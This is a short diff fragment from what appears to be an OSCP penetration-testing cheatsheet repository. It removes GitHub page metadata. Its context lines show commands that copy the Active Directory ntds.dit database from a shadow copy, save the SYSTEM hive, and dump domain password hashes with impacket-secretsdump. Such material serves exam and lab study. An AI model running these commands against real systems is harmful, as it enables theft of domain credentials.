@@ -1315,26 +1315,4 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\nt
 reg.exe save hklm\system c:\system.bak
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 
-About
 
-OSCP Cheatsheet by Sai Sathvik
-Resources
-Readme
-Activity
-Stars
-1k stars
-Watchers
-24 watching
-Forks
-239 forks
-Report repository
-Packages
-No packages published
-Contributors 2
-
-    @saisathvik1
-    saisathvik1 Sai Sathvik Ruppa
-    @ranemirusG
-    ranemirusG Ramiro Garcia
-
-Footer
